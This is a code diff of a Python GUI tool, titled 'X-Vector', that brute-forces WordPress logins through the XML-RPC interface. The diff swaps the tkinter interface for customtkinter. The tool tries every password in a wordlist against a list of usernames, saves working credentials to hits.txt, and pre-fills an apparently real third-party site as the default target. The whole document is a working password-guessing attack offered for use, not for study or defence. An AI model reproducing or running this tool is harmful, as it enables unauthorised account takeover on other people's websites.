@@ -1,11 +1,11 @@
-import tkinter as tk
-from tkinter import filedialog, messagebox, scrolledtext
+import customtkinter as ctk
+from tkinter import filedialog, messagebox
 import xmlrpc.client
 import threading
 
 def run_brute_force():
     target = target_entry.get().strip()
-    usernames = [u.strip() for u in usernames_entry.get("1.0", tk.END).strip().splitlines()]
+    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
     wordlist_path = wordlist_entry.get().strip()
 
     if not target or not usernames or not wordlist_path:
@@ -19,60 +19,69 @@ def run_brute_force():
         messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
         return
 
-    log_area.insert(tk.END, "[*] Starting brute force...\n")
+    log_box.insert("end", "[*] Starting brute force...\n")
     server = xmlrpc.client.ServerProxy(target)
 
     for user in usernames:
-        log_area.insert(tk.END, f"\n[*] Trying user: {user}\n")
+        log_box.insert("end", f"\n[*] Trying user: {user}\n")
         for password in passwords:
             try:
                 resp = server.wp.getUsersBlogs(user, password)
                 if resp:
                     hit = f"[+] HIT: {user}:{password}\n"
-                    log_area.insert(tk.END, hit)
+                    log_box.insert("end", hit)
                     with open("hits.txt", "a") as hit_file:
                         hit_file.write(f"{user}:{password}\n")
-                    break  # Stop trying more passwords if one works
+                    break
             except xmlrpc.client.Fault:
                 pass
             except Exception as e:
-                log_area.insert(tk.END, f"[-] Error with {user}: {e}\n")
+                log_box.insert("end", f"[-] Error with {user}: {e}\n")
                 break
-    log_area.insert(tk.END, "[*] Brute force finished.\n")
+    log_box.insert("end", "[*] Brute force finished.\n")
 
 def browse_wordlist():
     path = filedialog.askopenfilename()
     if path:
-        wordlist_entry.delete(0, tk.END)
+        wordlist_entry.delete(0, "end")
         wordlist_entry.insert(0, path)
 
-# === GUI SETUP ===
-app = tk.Tk()
-app.title("WordPress XML-RPC GUI Brute Force")
-app.geometry("600x500")
+# === Setup CustomTkinter ===
+ctk.set_appearance_mode("dark")
+ctk.set_default_color_theme("dark-blue")
 
-tk.Label(app, text="Target URL (https://example.com/xmlrpc.php):").pack()
-target_entry = tk.Entry(app, width=80)
+app = ctk.CTk()
+app.title("X-Vector | WordPress XML-RPC Brute Forcer")
+app.geometry("700x600")
+
+# === Target URL ===
+ctk.CTkLabel(app, text="Target URL (e.g. https://example.com/xmlrpc.php)").pack(pady=5)
+target_entry = ctk.CTkEntry(app, width=600)
 target_entry.insert(0, "https://www.zayachek.com/xmlrpc.php")
 target_entry.pack()
 
-tk.Label(app, text="Usernames (one per line):").pack()
-usernames_entry = tk.Text(app, height=5, width=80)
-usernames_entry.insert(tk.END, "admin\neditor\nauthor")
-usernames_entry.pack()
+# === Usernames ===
+ctk.CTkLabel(app, text="Usernames (one per line)").pack(pady=5)
+usernames_box = ctk.CTkTextbox(app, height=100, width=600)
+usernames_box.insert("0.0", "admin\neditor\nauthor")
+usernames_box.pack()
 
-tk.Label(app, text="Password List File:").pack()
-wordlist_frame = tk.Frame(app)
-wordlist_entry = tk.Entry(wordlist_frame, width=60)
-wordlist_entry.pack(side=tk.LEFT)
-browse_button = tk.Button(wordlist_frame, text="Browse", command=browse_wordlist)
-browse_button.pack(side=tk.LEFT)
+# === Wordlist ===
+ctk.CTkLabel(app, text="Password Wordlist File").pack(pady=5)
+wordlist_frame = ctk.CTkFrame(app)
 wordlist_frame.pack()
+wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
+wordlist_entry.pack(side="left", padx=5)
+browse_btn = ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist)
+browse_btn.pack(side="left")
 
-start_button = tk.Button(app, text="Start Brute Force", command=lambda: threading.Thread(target=run_brute_force).start(), bg="green", fg="white")
-start_button.pack(pady=10)
+# === Start Button ===
+start_btn = ctk.CTkButton(app, text="Start Brute Force", fg_color="green", hover_color="darkgreen", command=lambda: threading.Thread(target=run_brute_force).start())
+start_btn.pack(pady=15)
 
-log_area = scrolledtext.ScrolledText(app, width=80, height=15)
-log_area.pack()
+# === Log Area ===
+ctk.CTkLabel(app, text="Output Log").pack(pady=5)
+log_box = ctk.CTkTextbox(app, height=200, width=600)
+log_box.pack()
 
 app.mainloop()
